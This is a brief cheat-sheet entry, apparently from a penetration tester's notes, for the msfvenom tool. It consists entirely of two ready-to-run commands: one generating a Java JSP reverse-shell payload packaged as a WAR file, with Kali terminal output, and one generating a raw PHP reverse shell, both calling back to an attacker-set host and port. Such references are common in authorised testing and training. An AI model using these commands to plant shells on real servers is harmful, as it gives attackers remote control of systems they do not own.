# msfvenom
## Examples
### create Java JSP payload as war
```
┌──(kali㉿kali)-[~]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f war > exploit.war
Payload size: 1084 bytes
Final size of war file: 1084 bytes
```
### create PHP reverse shell payload
```
msfvenom -p php/reverse_php LHOST=$LOCAL_IP LPORT=$LOCAL_PORT -f raw > rev_shell.php
```